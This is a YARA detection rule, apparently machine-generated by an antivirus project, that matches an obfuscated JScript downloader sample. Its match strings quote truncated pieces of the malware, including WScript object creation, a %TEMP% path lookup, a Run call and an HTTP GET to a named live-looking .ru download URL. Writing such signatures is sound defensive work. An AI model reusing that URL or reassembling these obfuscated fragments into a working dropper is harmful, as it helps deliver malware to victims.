rule sig_20160428_75d6219a7fc1b79b011cc682dccf8edb {
  meta:
    description = "datamaliciousorder - file 20160428_75d6219a7fc1b79b011cc682dccf8edb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "58a1f21ae5242e8999180bdd49519bd7ee74e52c7921bac14eee6c543c50403d"

  strings:
    $s1  = "function GirClwYbuNqeVmrWuiYph() {return TxbDryRzzIjyDhfIuwBqy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "OukUvwZgcYjhVstZppWxa[PtfBjvUxvYfqStmPuqZch](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s3  = "function GirClwYbuNqeVmrWuiYph() {return TxbDryRzzIjyDhfIuwBqy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function JptRgaBuwJibXdkBvvOhi(RluPuxKgiHxmMfcIdfWym){TxbDryRzzIjyDhfIuwBqy[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function JptRgaBuwJibXdkBvvOhi(RluPuxKgiHxmMfcIdfWym){TxbDryRzzIjyDhfIuwBqy[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "return HmvCosGqfKwyPmzYdgRjc - SgcVtdNyjWzzOwnCkmKig;};" fullword ascii
    $s7  = "var TxbDryRzzIjyDhfIuwBqy = function GdwLupRtoHydZlrMwkShr() {return YrmVviMqwFwlFibDhfXqp[DmkSdtSftJlpRpqSawXen](\"WScript\"+\"" ascii
    $s8  = "function CmaHiuXuhMbdGobResAhc(HmvCosGqfKwyPmzYdgRjc, SgcVtdNyjWzzOwnCkmKig){EffYtzNfwIcpMwuQguWxm = EffYtzNfwIcpMwuQguWxm * 1; " ascii
    $s9  = "var TxbDryRzzIjyDhfIuwBqy = function GdwLupRtoHydZlrMwkShr() {return YrmVviMqwFwlFibDhfXqp[DmkSdtSftJlpRpqSawXen](\"WScript\"+\"" ascii
    $s10 = "var YrmVviMqwFwlFibDhfXqp = this[\"WScript\"];" fullword ascii
    $s11 = "function VyyWloFmfKzfVuvXifKre(){return YbbWxrVruWvuOegNmbIoe + \"\";};" fullword ascii
    $s12 = "function CmaHiuXuhMbdGobResAhc(HmvCosGqfKwyPmzYdgRjc, SgcVtdNyjWzzOwnCkmKig){EffYtzNfwIcpMwuQguWxm = EffYtzNfwIcpMwuQguWxm * 1; " ascii
    $s13 = "if (OukUvwZgcYjhVstZppWxa[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function CebCeiOmeDoiJqmVcjKbi() {return ((TlxPjfHeiKmsNznHtkYnc == true) && (TlxPjfHeiKmsNznHtkYnc == JeiYnoEfxJqcLuqLrzWrk)) ?" ascii
    $s15 = "function CebCeiOmeDoiJqmVcjKbi() {return ((TlxPjfHeiKmsNznHtkYnc == true) && (TlxPjfHeiKmsNznHtkYnc == JeiYnoEfxJqcLuqLrzWrk)) ?" ascii
    $s16 = "function LbwWdcTfsUhqSbqJzmXdc(UbuEvaTsrXezKztQmnSdv) {var KsiXtuNtrMiuBbkFmpZvr = (1, 2, 3, 4, 5, UbuEvaTsrXezKztQmnSdv); retur" ascii
    $s17 = "function RxnNorPfaWebLmlCdwBxa(){return DmkSdtSftJlpRpqSawXen;};" fullword ascii
    $s18 = "function LbwWdcTfsUhqSbqJzmXdc(UbuEvaTsrXezKztQmnSdv) {var KsiXtuNtrMiuBbkFmpZvr = (1, 2, 3, 4, 5, UbuEvaTsrXezKztQmnSdv); retur" ascii
    $s19 = "var FluNolHmgEyqXnjWjbYqu = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "JeiYnoEfxJqcLuqLrzWrk = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}